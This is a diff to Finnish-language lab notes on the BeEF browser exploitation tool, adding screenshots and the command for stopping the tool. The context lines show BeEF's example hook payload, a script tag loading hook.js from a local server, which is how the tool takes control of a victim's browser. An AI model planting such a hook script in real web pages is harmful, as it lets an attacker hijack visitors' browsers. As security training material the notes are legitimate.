@@ -141,6 +141,11 @@ Nämä kertovat, mitä scriptiä tullaan käyttää, ja miten päästää siihen
 [*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
 ```
 
+![Alt text](beef-harj/beef-3.PNG)
+
+myös vastaavasti, jos ei käytetä enään `BeEF` hakkeri työkalua niin sammuttaminen menee `beef-xss-stop -h`
+![Alt text](beef-harj/beef-4.PNG)
+
 # linkkei ja tarkennusta BeEF hakkeri työkalusta 
 
 https://kalilinuxtutorials.com/hacking-with-beef/ <br>
